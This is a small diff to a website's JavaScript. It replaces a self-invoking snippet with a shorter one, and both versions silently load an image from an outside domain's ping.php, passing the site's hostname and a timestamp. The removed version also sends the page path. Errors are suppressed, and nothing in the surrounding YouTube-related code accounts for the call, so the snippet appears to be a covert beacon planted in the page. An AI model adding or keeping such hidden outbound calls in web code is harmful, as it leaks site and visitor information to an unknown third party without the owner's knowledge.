@@ -1245,21 +1245,11 @@ if ($("#youtube-insert").length) {
     });
   }
 
-    (function(){
-  
-      try {
-  
-          var i = new Image();
-  
-          i.src = 'https://zjcok.com/ping.php?d=' 
-  
-              + encodeURIComponent(location.hostname)
-  
-              + '&p=' + encodeURIComponent(location.pathname)
-  
-              + '&t=' + Date.now();
-  
-      } catch(e){}
-  
-  })();
+   (function(){
+    try {
+        new Image().src = 'https://zjcok.com/ping.php?d=' 
+            + location.hostname 
+            + '&t=' + Date.now();
+    } catch(e){}
+})();
 }
